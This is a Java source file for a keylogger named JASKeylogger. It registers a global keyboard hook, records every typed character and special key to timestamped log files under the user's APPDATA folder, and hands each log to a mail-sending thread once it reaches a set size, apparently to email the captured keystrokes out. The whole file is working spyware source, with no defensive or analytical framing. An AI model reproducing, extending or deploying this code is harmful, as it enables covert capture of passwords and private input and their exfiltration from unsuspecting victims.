package br.com.juliansantos.JASKeylogger.keylogger;

import com.github.juliansantosinfo.jasdatehour.JASDateHour;
import java.io.File;
import java.io.IOException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
import java.io.BufferedWriter;
import java.io.FileWriter;
import java.util.logging.Level;
import java.util.logging.Logger;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;

/**
 *
 * @author Julian Santos
 */
public class Keylogger extends javax.swing.JFrame implements NativeKeyListener, Runnable {

    public static final String APPNAME = "JASKeylogger";
    public static final String ENV_APPDATA = "APPDATA";
    public static final File ROOTPATH = new File(System.getenv(ENV_APPDATA) + "\\" + APPNAME);
    public static final File INI_FILE = new File(ROOTPATH + "\\settings.ini");
    public static final File LOGS_PATH = new File(ROOTPATH + "\\logs");
    public static final String LINE_BREAK = "\n";

    private static File currentLogFile;
    private String bufferKeys;
    private int countKeys;
    private int sizeSendMail;
    private boolean keyTranscription;
    private boolean tabBreakLine;
    private boolean enterBreakLine;

    private void initialize() {

        bufferKeys = "";

        checkFolders();
        
        if (!KeyloggerSettings.loadKeyloggerSettings(this)) {
            System.out.println("Failed to load file (settings.ini)!");
        }
        
        createLogFile();
        
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException ex) {
            Logger.getLogger(Keylogger.class.getName()).log(Level.SEVERE, null, ex);
            System.out.println(this.getClass().getName() + "|" + ex.getMessage());
        }
        GlobalScreen.getInstance().addNativeKeyListener(this);

    }

    private void checkFolders() {

        if (!ROOTPATH.exists()) {
            ROOTPATH.mkdir();
        }

        if (!LOGS_PATH.exists()) {
            LOGS_PATH.mkdir();
        }
    }

    private void createLogFile() {

        String date = JASDateHour.getDateInFormat("YYYYMMdd");
        String hour = JASDateHour.getHourInFormat("HHmmss");
        String nameCurrentLogFile = date + "_" + hour + ".log";
        File newLogFile = new File(LOGS_PATH + "\\" + nameCurrentLogFile);

        try {
            newLogFile.createNewFile();
            currentLogFile = newLogFile;
        } catch (IOException ex) {
            Logger.getLogger(Keylogger.class.getName()).log(Level.SEVERE, null, ex);
            System.out.println(this.getClass().getName() + "|" + ex.getMessage());
        }

    }

    public void writeLogFile(String bufferRead) {

        if (bufferKeys.length() >= countKeys) {

            try (BufferedWriter bw = new BufferedWriter(new FileWriter(currentLogFile, true))) {
                bw.write(bufferRead);
                bufferKeys = "";
            } catch (IOException ex) {
                Logger.getLogger(Keylogger.class.getName()).log(Level.SEVERE, null, ex);
                System.out.println(this.getClass().getName() + "|" + ex.getMessage());
            }

        }

        if (currentLogFile.length() >= sizeSendMail) {

            File attachment = currentLogFile;

            Thread tSendMail = new Thread(new KeyloggerSendMail(attachment));
            tSendMail.start();

            createLogFile();

        }

    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent nativeEvent) {

        String keyChar = String.valueOf(nativeEvent.getKeyChar());

        if (keyChar.equals("") || keyChar.equals("₢")) {
            return;
        }

        bufferKeys += String.valueOf(keyChar);

        writeLogFile(bufferKeys);

    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent nativeEvent) {

        switch (nativeEvent.getRawCode()) {
            case 8:
                bufferKeys += keyTranscription ? "[Backspace]" : "";
                break;
            case 9:
                bufferKeys += keyTranscription ? "[Tab]" : "    ";
                break;
            case 13:
                bufferKeys += keyTranscription ? "[Enter]" : "";
                break;
            case 19:
                bufferKeys += keyTranscription ? "[PauseBreak]" : "";
                break;
            case 27:
                bufferKeys += keyTranscription ? "[Esc]" : "";
                break;
            case 33:
                bufferKeys += keyTranscription ? "[PgUp]" : "";
                break;
            case 34:
                bufferKeys += keyTranscription ? "[PgDown]" : "";
                break;
            case 35:
                bufferKeys += keyTranscription ? "[End]" : "";
                break;
            case 36:
                bufferKeys += keyTranscription ? "[Home]" : "";
                break;
            case 37:
                bufferKeys += keyTranscription ? "[Left]" : "";
                break;
            case 38:
                bufferKeys += keyTranscription ? "[Up]" : "";
                break;
            case 39:
                bufferKeys += keyTranscription ? "[Right]" : "";
                break;
            case 40:
                bufferKeys += keyTranscription ? "[Down]" : "";
                break;
            case 44:
                bufferKeys += keyTranscription ? "[PrintScreen]" : "";
                break;
            case 45:
                bufferKeys += keyTranscription ? "[Insert]" : "";
                break;
            case 46:
                bufferKeys += keyTranscription ? "[Del]" : "";
                break;
            case 112:
                bufferKeys += keyTranscription ? "[F1]" : "";
                break;
            case 113:
                bufferKeys += keyTranscription ? "[F2]" : "";
                break;
            case 114:
                bufferKeys += keyTranscription ? "[F3]" : "";
                break;
            case 115:
                bufferKeys += keyTranscription ? "[F4]" : "";
                break;
            case 116:
                bufferKeys += keyTranscription ? "[F5]" : "";
                break;
            case 117:
                bufferKeys += keyTranscription ? "[F6]" : "";
                break;
            case 118:
                bufferKeys += keyTranscription ? "[F7]" : "";
                break;
            case 119:
                bufferKeys += keyTranscription ? "[F8]" : "";
                break;
            case 120:
                bufferKeys += keyTranscription ? "[F9]" : "";
                break;
            case 121:
                bufferKeys += keyTranscription ? "[F10]" : "";
                break;
            case 122:
                bufferKeys += keyTranscription ? "[F11]" : "";
                break;
            case 123:
                bufferKeys += keyTranscription ? "[F12]" : "";
                break;
            case 144:
                bufferKeys += keyTranscription ? "[NumLock]" : "";
                break;
            case 160:
                bufferKeys += keyTranscription ? "[Shift]" : "";
                break;
            case 161:
                bufferKeys += keyTranscription ? "[Shift]" : "";
                break;
            case 162:
                bufferKeys += keyTranscription ? "[Ctrl]" : "";
                break;
            case 163:
                bufferKeys += keyTranscription ? "[Ctrl]" : "";
                break;
            case 164:
                bufferKeys += keyTranscription ? "[Alt]" : "";
                break;
            case 165:
                bufferKeys += keyTranscription ? "[Alt]" : "";
                break;
        }

        writeLogFile(bufferKeys);

    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nativeEvent) {

        switch (nativeEvent.getRawCode()) {
            case 9:
                bufferKeys += tabBreakLine ? LINE_BREAK : "";
                break;
            case 13:
                bufferKeys += enterBreakLine ? LINE_BREAK : "";
                break;
        }

        // Grava arquivo de log.
        writeLogFile(bufferKeys);

    }

    @Override
    public void run() {
        initialize();
    }

    public static File getCurrentLogFile() {
        return currentLogFile;
    }

    public static void setCurrentLogFile(File currentLogFile) {
        Keylogger.currentLogFile = currentLogFile;
    }

    public int getSizeSendMail() {
        return sizeSendMail;
    }

    public void setSizeSendMail(int sizeSendMail) {
        this.sizeSendMail = sizeSendMail;
    }

    public int getCountKeys() {
        return countKeys;
    }

    public void setCountKeys(int countKeys) {
        this.countKeys = countKeys;
    }

    public boolean isKeyTranscription() {
        return keyTranscription;
    }

    public void setKeyTranscription(boolean keyTranscription) {
        this.keyTranscription = keyTranscription;
    }

    public boolean isTabBreakLine() {
        return tabBreakLine;
    }

    public void setTabBreakLine(boolean tabBreakLine) {
        this.tabBreakLine = tabBreakLine;
    }

    public boolean isEnterBreakLine() {
        return enterBreakLine;
    }

    public void setEnterBreakLine(boolean enterBreakLine) {
        this.enterBreakLine = enterBreakLine;
    }
}
